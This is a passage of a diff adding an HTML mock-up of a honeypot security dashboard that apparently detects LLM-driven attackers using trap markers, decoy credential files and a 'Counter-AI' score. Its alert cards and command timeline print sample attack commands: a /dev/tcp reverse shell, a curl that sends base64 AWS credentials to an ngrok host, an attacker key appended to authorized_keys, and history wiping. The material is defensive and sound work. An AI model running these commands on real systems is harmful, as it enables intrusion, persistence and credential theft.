+        <span class="hold-hint">hold</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- TOP ROW: Counter-AI + Alerts -------------------------------- -->
+  <div class="top-row">
+
+    <!-- Counter-AI card -->
+    <div class="card">
+      <div class="card-head">
+        <span>Counter-AI detector</span>
+        <span class="count">composite 0.88</span>
+      </div>
+      <div class="counter-ai-body">
+        <div class="gauge-row">
+          <div class="gauge-big">
+            <svg viewBox="0 0 100 100">
+              <!-- bg ring -->
+              <circle cx="50" cy="50" r="42"
+                      fill="none" stroke="var(--surface-2)" stroke-width="9" />
+              <!-- threshold ticks (subtle) -->
+              <line x1="50" y1="50" x2="92" y2="50"
+                    stroke="var(--fg-4)" stroke-width="1.2"
+                    transform="rotate(198, 50, 50)" opacity="0.4" />
+              <line x1="50" y1="50" x2="92" y2="50"
+                    stroke="var(--fg-4)" stroke-width="1.2"
+                    transform="rotate(252, 50, 50)" opacity="0.4" />
+              <!-- conf=0.88: 88% of 264 ≈ 232 -->
+              <circle cx="50" cy="50" r="42"
+                      fill="none" stroke="var(--sev-critical)" stroke-width="9"
+                      stroke-dasharray="232 264"
+                      stroke-linecap="round" />
+            </svg>
+            <div class="gauge-center">
+              <div class="gauge-val">0.88</div>
+              <div class="gauge-label">composite</div>
+              <div class="gauge-trend">▲ 0.34 → 0.88 last 4 min</div>
+            </div>
+          </div>
+          <div class="signals-big">
+            <div class="signal-big">
+              <span class="signal-big-name">timing</span>
+              <div class="signal-big-bar"><div class="signal-big-fill timing" style="width: 92%;"></div></div>
+              <span class="signal-big-val">0.92</span>
+            </div>
+            <div class="signal-big">
+              <span class="signal-big-name">lexical</span>
+              <div class="signal-big-bar"><div class="signal-big-fill lex" style="width: 71%;"></div></div>
+              <span class="signal-big-val">0.71</span>
+            </div>
+            <div class="signal-big">
+              <span class="signal-big-name">injection</span>
+              <div class="signal-big-bar"><div class="signal-big-fill inj" style="width: 50%;"></div></div>
+              <span class="signal-big-val">0.50</span>
+            </div>
+            <div class="signal-big" style="margin-top: 4px;">
+              <span class="signal-big-name dim2">trap echo</span>
+              <div class="signal-big-bar"><div class="signal-big-fill inj" style="width: 100%; background: linear-gradient(90deg, #dc2626, #f87171);"></div></div>
+              <span class="signal-big-val" style="color: var(--sev-critical);">YES</span>
+            </div>
+          </div>
+        </div>
+        <div class="gate-row">
+          <div class="gate-card fired">
+            <div class="gate-name">LLM-likely gate ≥ 0.55</div>
+            <div class="gate-status">FIRED <span class="gate-thresh">at 0.88 ≫ 0.55</span></div>
+          </div>
+          <div class="gate-card fired">
+            <div class="gate-name">Trap-arm gate ≥ 0.70</div>
+            <div class="gate-status">ARMED <span class="gate-thresh">trap echoed → PROVEN</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Alerts card -->
+    <div class="card">
+      <div class="card-head">
+        <span>Alerts</span>
+        <span class="count">5 fired</span>
+      </div>
+      <div class="alerts-grid">
+        <div class="alert-row">
+          <span class="sev crit">CRIT</span>
+          <div class="body">
+            <span class="name">alert_attacker_llm_proven</span>
+            <span class="trigger">trap marker MC7A3F2D echoed in command 14:27:12</span>
+          </div>
+          <span class="ts">14:27:12</span>
+        </div>
+        <div class="alert-row">
+          <span class="sev crit">CRIT</span>
+          <div class="body">
+            <span class="name">alert_reverse_shell</span>
+            <span class="trigger">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span>
+          </div>
+          <span class="ts">14:28:01</span>
+        </div>
+        <div class="alert-row">
+          <span class="sev crit">CRIT</span>
+          <div class="body">
+            <span class="name">alert_ssh_persistence</span>
+            <span class="trigger">echo "ssh-rsa AAAAB3...attacker@evil" &gt;&gt; ~/.ssh/authorized_keys</span>
+          </div>
+          <span class="ts">14:27:48</span>
+        </div>
+        <div class="alert-row">
+          <span class="sev high">HIGH</span>
+          <div class="body">
+            <span class="name">alert_credential_exfil</span>
+            <span class="trigger">cat /home/jdoe/.aws/credentials</span>
+          </div>
+          <span class="ts">14:26:14</span>
+        </div>
+        <div class="alert-row">
+          <span class="sev high">HIGH</span>
+          <div class="body">
+            <span class="name">alert_dns_exfil</span>
+            <span class="trigger">curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)</span>
+          </div>
+          <span class="ts">14:25:02</span>
+        </div>
+        <div class="alert-row">
+          <span class="sev med">MED</span>
+          <div class="body">
+            <span class="name">alert_decoy_swallowed</span>
+            <span class="trigger">cat /etc/sudoers.d/zzz_compat — planted decoy ingested</span>
+          </div>
+          <span class="ts">14:25:23</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- BOTTOM ROW: Command timeline + filesystem diff ------------- -->
+  <div class="bottom-row">
+    <div class="card">
+      <div class="card-head">
+        <span>Command timeline</span>
+        <span class="count">19 cmds · last 4m 22s</span>
+      </div>
+      <div class="timeline">
+        <div class="cmd">
+          <span class="cmd-ts">14:23:41</span>
+          <span class="cmd-src cache">cache</span>
+          <span class="cmd-text">uname -a</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:23:54</span>
+          <span class="cmd-src cache">cache</span>
+          <span class="cmd-text">whoami</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:24:02</span>
+          <span class="cmd-src sim-bot">sim-bot</span>
+          <span class="cmd-text">who</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:24:18</span>
+          <span class="cmd-src vfs">vfs-read</span>
+          <span class="cmd-text">cat /etc/passwd</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:24:31</span>
+          <span class="cmd-src find">find</span>
+          <span class="cmd-text">find / -name id_rsa 2&gt;/dev/null</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:25:03</span>
+          <span class="cmd-src vfs">vfs-read</span>
+          <span class="cmd-text">cat ~/.aws/credentials</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd alerted">
+          <span class="cmd-ts">14:25:02</span>
+          <span class="cmd-src alert">!ALERT</span>
+          <span class="cmd-text">curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:25:23</span>
+          <span class="cmd-src vfs">vfs-read</span>
+          <span class="cmd-text">cat /etc/sudoers.d/zzz_compat</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd alerted">
+          <span class="cmd-ts">14:27:12</span>
+          <span class="cmd-src alert">!TRAP</span>
+          <span class="cmd-text">grep MC7A3F2D /var/log/internal-audit 2&gt;/dev/null  ← marker echoed</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:25:44</span>
+          <span class="cmd-src llm">llm</span>
+          <span class="cmd-text">sudo -l</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:26:11</span>
+          <span class="cmd-src vfs">vfs-write</span>
+          <span class="cmd-text">touch /tmp/breadcrumb.txt</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd">
+          <span class="cmd-ts">14:26:14</span>
+          <span class="cmd-src llm">llm</span>
+          <span class="cmd-text">history -c</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd alerted">
+          <span class="cmd-ts">14:27:48</span>
+          <span class="cmd-src alert">!ALERT</span>
+          <span class="cmd-text">echo "ssh-rsa AAAAB3..." &gt;&gt; ~/.ssh/authorized_keys</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+        <div class="cmd alerted">
+          <span class="cmd-ts">14:28:01</span>
+          <span class="cmd-src alert">!ALERT</span>
+          <span class="cmd-text">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span>
+          <span class="cmd-zoom">⌕</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-head">
+        <span>Filesystem diff vs. baseline</span>
+        <span class="count">3 added · 2 modified</span>
+      </div>
+      <div class="diff-grid">
+        <div class="diff-row honeytok">
+          <span class="diff-mark mod">M</span>
+          <span class="diff-path">~/.aws/credentials</span>
+          <span class="diff-meta">271 → 13 B</span>
+        </div>
+        <div class="diff-row honeytok">
+          <span class="diff-mark mod">M</span>
+          <span class="diff-path">~/.ssh/authorized_keys</span>
+          <span class="diff-meta">0 → 55 B</span>
+        </div>
+        <div class="diff-row">
+          <span class="diff-mark add">+</span>
+          <span class="diff-path">/tmp/breadcrumb.txt</span>
+          <span class="diff-meta">14 B · 14:26:11</span>
+        </div>
+        <div class="diff-row">
+          <span class="diff-mark add">+</span>
+          <span class="diff-path">/tmp/.hidden</span>
+          <span class="diff-meta">13 B · 14:26:23</span>
+        </div>
+        <div class="diff-row">
+          <span class="diff-mark add">+</span>
+          <span class="diff-path">/tmp/stolen.txt</span>
+          <span class="diff-meta">271 B · 14:25:08</span>
+        </div>
+
+        <div style="margin-top: 14px; padding-top: 10px; border-top: 1px dashed var(--border-2);">
+          <div class="card-head" style="border: none; padding: 0 0 6px; font-size: 10px;">
+            <span>decoys planted / swallowed</span>
+            <span class="count">2 / 1</span>
+          </div>
+          <div class="diff-row">
+            <span class="diff-mark add">⊕</span>
+            <span class="diff-path">/etc/sudoers.d/zzz_compat <span class="dim2">— ingested</span></span>
+            <span class="diff-meta" style="color: var(--sev-medium);">swallowed</span>
+          </div>
+          <div class="diff-row">
+            <span class="diff-mark add">⊕</span>
+            <span class="diff-path">~/.aws/dev_credentials</span>
+            <span class="diff-meta">planted, not yet read</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Operator notes (rich-text-output-markdown) -->
+  <div class="card">
+    <div class="card-head">
+      <span>Operator notes</span>
+      <span class="count">2 · last by mwilson 8m ago</span>
+    </div>
+
+    <!-- Existing notes — markdown rendered to HTML for display -->
+    <div class="notes-list">
+      <div class="note-item">
+        <div class="note-header">
+          <span class="note-author">agarcia</span>
+          <span class="note-ts">14:24:12 UTC · 4 min ago</span>
+        </div>
+        <div class="note-body">
+          Same source IP pattern as engagement <code>8d1bd057</code> from yesterday.
+          <strong>Likely the same actor.</strong> Pulling the IoC bundle and
+          cross-referencing with the threat-intel feed.
+        </div>
+      </div>
+      <div class="note-item">
+        <div class="note-header">
+          <span class="note-author">mwilson</span>
+          <span class="note-ts">14:20:08 UTC · 8 min ago</span>
+        </div>
+        <div class="note-body">
+          Counter-AI score climbing fast — let it run until trap arms,
+          then snapshot for the case study. <em>Do not kill yet.</em>
+          Pinging <span style="color: var(--brand); font-weight: 500;">@jdoe-oncall</span>
+          for awareness.
+        </div>
+      </div>
+    </div>
+
+    <!-- Composer — toolbar inserts markdown syntax around selections so
+         non-markdown-savvy analysts get WYSIWYG-style controls and the
+         stored payload is still plain markdown (diffs cleanly, renders
+         consistently across audit.py + dashboard + IoC export). -->
+    <div class="note-editor">
+      <div class="editor-tabs">
+        <span class="editor-tab active">Write</span>
+        <span class="editor-tab">Preview</span>
+        <span style="margin-left: auto; font-family: var(--mono); font-size: 10px; color: var(--fg-4);">
+          markdown stored · WYSIWYG controls
+        </span>
+      </div>
+      <div class="editor-toolbar">
+        <span class="editor-tool bold" title="Bold (Ctrl+B)">B</span>
+        <span class="editor-tool italic" title="Italic (Ctrl+I)">I</span>
+        <span class="editor-tool strike" title="Strikethrough">S</span>
+        <span class="editor-divider"></span>
+        <span class="editor-tool code" title="Inline code (Ctrl+E)">&lt;/&gt;</span>
+        <span class="editor-tool" title="Code block">{ }</span>
+        <span class="editor-divider"></span>
+        <span class="editor-tool" title="Link (Ctrl+K)">🔗</span>
+        <span class="editor-tool" title="Bullet list">•</span>
+        <span class="editor-tool" title="Numbered list">1.</span>
+        <span class="editor-tool" title="Quote">❝</span>
+        <span class="editor-divider"></span>
+        <span class="editor-tool" title="Mention an operator (@)">@</span>
+        <span class="editor-tool" title="Reference another engagement (#)">#</span>
+        <span class="editor-tool" title="Insert IoC from current engagement">⊕</span>
+      </div>
+      <textarea class="editor-textarea" placeholder="Add a note for the next analyst on shift…  Type @ to mention, # to reference another engagement, ⊕ to drop in an IoC. Plain text works — formatting is optional.">Trap fired @ 14:27:12 — capturing snapshot for the launch case study. The marker echo is the most defensible evidence we've ever had. @phoebe will take handoff at 15:00.</textarea>
+      <div class="editor-footer">
+        <span class="hint">Ctrl+Enter to save · Markdown syntax accepted directly</span>
+        <button class="editor-save">Save note</button>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ================================================================ -->
+<!-- FOOTER                                                             -->
+<!-- ================================================================ -->
+<div class="footer">
+  <div>
+    <span class="pulse-dot"></span>SSE stream
+    <span class="sep">·</span>
+    /panel/engagement/2b51584b
+    <span class="sep">·</span>
+    independent of main dashboard
+  </div>
+  <div>
+    <a href="#">→ raw JSON</a>
+    <span class="sep">·</span>
+    <a href="#">→ audit.py</a>
+    <span class="sep">·</span>
+    <a href="#">→ narrate</a>
+    <span class="sep">·</span>
+    <a href="#">→ IoC export</a>
+    <span class="sep">·</span>
+    <a href="#">→ Sigma rule</a>
+  </div>
+</div>
+
+<!-- ================================================================ -->
+<!-- Tiny inline JS — theme + TV mode toggles.  The only JS in the     -->
+<!-- prototype; everything else is server-rendered HTML/CSS.            -->
+<!-- ================================================================ -->
+<script>
+  (function () {
+    // ---------------------------------------------------------------
+    // Theme resolution order:
+    //   1. operator's explicit choice (localStorage) — highest priority
+    //   2. OS-level prefers-color-scheme (auto-detect via matchMedia)
+    //   3. dark (sane default for a SOC tool)
+    //
+    // The OS preference is also watched live so an analyst who flips
+    // their system theme mid-shift (e.g. macOS sunset) sees the
+    // dashboard adapt — UNLESS they've explicitly set a manual choice,
+    // in which case manual wins.
+    // ---------------------------------------------------------------
+    var stored = localStorage.getItem("plenith-theme");   // "light" | "dark" | null
+
+    function applyTheme() {
+      var explicit = localStorage.getItem("plenith-theme");
+      var prefersLight = window.matchMedia &&
+                          window.matchMedia("(prefers-color-scheme: light)").matches;
+      var useLight = (explicit === "light") ||
+                      (explicit === null && prefersLight);
+      document.body.classList.toggle("light", useLight);
+      var ico  = document.getElementById("theme-ico");
+      var name = document.getElementById("theme-name");
+      if (ico)  ico.textContent  = useLight ? "☀" : "☾";
+      if (name) name.textContent = useLight ? "Light" : "Dark";
+    }
+
+    applyTheme();
+
+    // Manual toggle — operator's explicit choice trumps OS pref.
+    document.getElementById("theme-toggle").addEventListener("click", function () {
+      var nowLight = !document.body.classList.contains("light");
+      localStorage.setItem("plenith-theme", nowLight ? "light" : "dark");
+      applyTheme();
+    });
+
+    // React to OS-level theme changes live (only honored when the
+    // operator hasn't set an explicit preference).
+    if (window.matchMedia) {
+      window.matchMedia("(prefers-color-scheme: light)")
+            .addEventListener("change", applyTheme);
+    }
+
+    // TV mode — hides chrome, scales fonts, designed for the wall
+    // display. In the functional version this also auto-rotates focus
+    // between sections every 30s; the rotation logic lives in the
+    // dashboard runtime, not the static mock.
+    document.getElementById("tv-toggle").addEventListener("click", function () {
+      document.body.classList.toggle("tv");
+      this.classList.toggle("active");
+    });
+
+    // Editor tabs (Write / Preview) — placeholder, demonstrates the
+    // tab-switching pattern; live editor would swap textarea vs.
+    // rendered-markdown view.
+    document.querySelectorAll(".editor-tab").forEach(function (tab) {
+      tab.addEventListener("click", function () {
+        document.querySelectorAll(".editor-tab").forEach(function (t) {
+          t.classList.remove("active");
+        });
+        tab.classList.add("active");
+      });
+    });
+  })();
+</script>
+
+</body>
+</html>
